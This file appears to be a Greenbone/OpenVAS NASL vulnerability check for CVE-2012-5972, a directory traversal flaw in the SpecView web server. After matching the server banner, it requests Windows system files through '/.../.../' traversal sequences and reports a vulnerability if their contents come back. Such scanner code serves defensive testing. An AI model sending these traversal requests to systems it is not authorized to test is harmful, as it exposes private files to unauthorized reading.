if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103506" );
	script_bugtraq_id( 54243 );
	script_cve_id( "CVE-2012-5972" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "SpecView Web Server Directory Traversal Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-07-02 12:15:35 +0200 (Mon, 02 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "SpecView/banner" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54243" );
	script_tag( name: "summary", value: "SpecView is prone to a directory-traversal vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "insight", value: "Remote attackers can use specially crafted requests with directory-
  traversal sequences ('../') to retrieve arbitrary files in the context of the application." );
	script_tag( name: "impact", value: "Exploiting this issue may allow an attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "SpecView" )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/.../.../.../.../.../.../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

